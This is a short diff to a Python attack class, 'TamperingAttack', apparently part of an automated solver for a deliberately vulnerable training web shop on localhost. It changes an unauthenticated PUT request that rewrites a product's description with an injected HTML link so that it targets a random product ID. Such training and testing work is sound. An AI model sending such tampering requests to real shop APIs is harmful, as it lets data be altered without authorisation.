@@ -91,11 +91,15 @@ class TamperingAttack(Attack):
         if self.verbose:
             print ("ENTER LINK TAMPERING ATTACK")
 
-        url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/api/Products/9"
+        randomProduct = random.randint(1, 32)
+        while (randomProduct == 27 or randomProduct == 30):
+            randomProduct = random.randint(1, 32)
+        
+        url = "http://localhost:" + str(config[self.attackType + "_port"]) + "/api/Products/" + str(randomProduct)
         headers = {"Content-Type": "application/json"}
         body = {"description": "<a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}
         r = requests.put(url=url, headers=headers, data=json.dumps(body))
-        
+
         if self.verbose:
             print (r.status_code)
 
